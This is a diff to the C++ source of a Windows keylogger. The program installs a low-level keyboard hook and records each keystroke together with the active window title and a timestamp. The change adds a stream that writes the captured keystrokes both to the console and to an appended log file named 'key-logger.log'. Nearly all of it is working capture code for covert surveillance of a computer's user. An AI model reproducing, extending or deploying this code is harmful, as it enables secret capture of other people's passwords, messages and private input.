@@ -12,15 +12,45 @@
 
 #include "winkey.hpp"
 
+#define FILENAME "key-logger.log"
+
+class duplicated_stream
+{
+};
+
 static HHOOK g_hHook = NULL;
 static char g_WindowTitle[MAX_PATH];
+static std::ofstream g_OutputFile;
+static duplicated_stream g_Output;
+
+duplicated_stream& operator <<(duplicated_stream &stream, std::ostream& (*fn)(std::ostream&))
+{
+	g_OutputFile << fn;
+	std::cout << fn;
+	return (stream);
+}
+
+template<typename T>
+	duplicated_stream& operator <<(duplicated_stream &stream, const T &value)
+	{
+		g_OutputFile << value;
+		std::cout << value;
+		return (stream);
+	}
 
 INT CreateKeyLogger()
 {
 	g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
 	if (g_hHook == NULL)
 	{
-		std::cout << "Failed to install hook procedure." << std::endl;
+		std::cerr << "Failed to install hook procedure." << std::endl;
+		return (EXIT_FAILURE);
+	}
+
+	g_OutputFile.open(FILENAME, std::fstream::app);
+	if (!g_OutputFile)
+	{
+		std::cerr << "Could not open file." << std::endl;
 		return (EXIT_FAILURE);
 	}
 
@@ -31,6 +61,9 @@ VOID DestroyKeyLogger()
 {
 	if (g_hHook)
 		UnhookWindowsHookEx(g_hHook);
+
+	if (g_OutputFile.is_open())
+		g_OutputFile.close();
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -80,7 +113,7 @@ VOID LogWindow()
 	char dateString[48];
 	GetDateFormat(LOCALE_SYSTEM_DEFAULT, 0, &time, "yyyy'.'MM'.'dd", dateString, _countof(dateString));
 
-	std::cout << "\n[" << dateString << ' ' << timeString << "] - '" << g_WindowTitle << '\'' << std::endl;
+	g_Output << "\n[" << dateString << ' ' << timeString << "] - '" << g_WindowTitle << '\'' << std::endl;
 }
 
 BOOL TryLogUnicode(KBDLLHOOKSTRUCT *pKeyboard)
@@ -105,7 +138,7 @@ BOOL TryLogUnicode(KBDLLHOOKSTRUCT *pKeyboard)
 	if (!IsAllPrintable(buffer, strlen(buffer)))
 		return (false);
 
-	std::cout << buffer;
+	g_Output << buffer;
 	return (true);
 }
 
@@ -116,7 +149,7 @@ BOOL TryLogKey(KBDLLHOOKSTRUCT *pKeyboard)
 	if (!GetKeyNameText(pKeyboard->scanCode << 16, keyString, _countof(keyString)))
 		return (false);
 
-	std::cout << keyString;
+	g_Output << keyString;
 	return (true);
 }
 
@@ -133,7 +166,7 @@ VOID LogKey(KBDLLHOOKSTRUCT *pKeyboard)
 
 		case VK_RETURN:
 		{
-			std::cout << "\\n\n";
+			g_Output << "\\n\n";
 			break;
 		}
 
@@ -145,11 +178,11 @@ VOID LogKey(KBDLLHOOKSTRUCT *pKeyboard)
 				success = TryLogKey(pKeyboard);
 
 			if (!success)
-				std::cout << "(unk:vk." << pKeyboard->vkCode << ")";
+				g_Output << "(unk:vk." << pKeyboard->vkCode << ")";
 
 			break;
 		}
 	}
 
-	std::cout << std::flush;
+	g_Output << std::flush;
 }
